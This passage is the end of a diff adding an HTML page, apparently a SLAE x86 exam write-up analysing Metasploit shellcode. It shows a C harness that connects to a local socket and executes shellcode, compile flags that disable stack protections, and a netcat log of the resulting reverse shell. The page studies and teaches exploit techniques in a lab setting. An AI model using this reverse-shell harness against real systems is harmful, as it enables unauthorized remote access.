+    <span class="kt">char</span> <span class="o">*</span><span class="n">empty</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">client_address</span><span class="p">;</span>
+
+    <span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">inet_aton</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">client_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
+    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>
+    <span class="n">connect</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_address</span><span class="p">));</span>
+
+    <span class="c1">// END block of code of code taken from assignment n.2</span>
+
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
+    <span class="n">ret</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>To compile it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-w</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack file.c
+</code></pre></div></div>
+<p>It worked as expected, spawning a reverse shell in the other window, where I set up the netcat listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbct@slae:~<span class="nv">$ </span>nc <span class="nt">-nvl</span> 4444
+<span class="c"># fjHh</span>
+<span class="c"># Connection from 127.0.0.1 port 4444 [tcp/*] accepted</span>
+<span class="nb">id</span>
+<span class="c"># uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span>
+<span class="nb">whoami</span>
+<span class="c"># rbct</span>
+<span class="nb">exit
+</span>rbct@slae:~<span class="nv">$ </span>
+</code></pre></div></div>
+<p>This type of shellcode would be used in cases where you've already set up a connection to a TCP socket, and you have control over it, so you're able to send the data desired, and most importantly the first 4 bytes specified in the shellcode.</p>
+
+
+            <footer class="tags">
+                <section class="mono tags">
+                    Tagged
+
+                    
+                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/shellcode/">shellcode</a>, <a href="/tags#/tags/metasploit/">metasploit</a>, <a href="/tags#/tags/x86/">x86</a>
+                </section><section class="pagination">
+                        <a href="/21/12/25/slae32-assignment-5_4">
+                            <div class="mono">NEXT</div>
+                            SLAE x86 Exam - Assignment #5 Part 4
+                        </a>
+                    </section><section class="pagination">
+                        <a href="/21/12/25/slae32-assignment-5_2">
+                            <div class="mono">PREVIOUS</div>
+                            SLAE x86 Exam - Assignment #5 Part 2
+                        </a>
+                    </section></footer>
+        </main>
+    </article>
+  </body>
+</html>
